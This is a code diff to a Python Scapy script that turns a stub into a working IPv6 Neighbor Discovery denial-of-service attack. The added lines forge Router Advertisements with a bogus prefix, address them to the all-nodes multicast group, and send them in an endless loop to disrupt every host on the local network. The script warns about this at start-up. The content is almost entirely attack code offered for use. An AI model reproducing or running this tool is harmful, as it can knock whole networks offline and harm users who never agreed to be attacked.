@@ -10,11 +10,23 @@ from scapy.all import *
 #
 def initialize():
 	tmp = raw_input('[!] WARNING: This will NDP DoS the entire local network.  Is this correct? ') 
-	if tmp == 'n':
+	if 'n' in tmp.lower(): 
 		return
 
-	#TODO finish
+	conf.verb = 0
+	count = 0
+
 	print '[!] Starting Router Advertisement...'
+
 	# build the forged packet
-	pkt = Ether()/IPv6()/ICMPv6ND_RA()
-	sendp(pkt)
+	pkt = IPv6(dst='ff02::1')
+	pkt /= ICMPv6ND_RA()
+	pkt /= ICMPv6NDOptPrefixInfo(prefixlen=64,prefix='ba11:a570::')
+
+	# start DoSing...
+	try:
+		send(pkt, loop=1, inter=0.1)
+		count += 1
+	except:
+		pass
+	print '[+] Done.  Sent %d advertisements.'%count
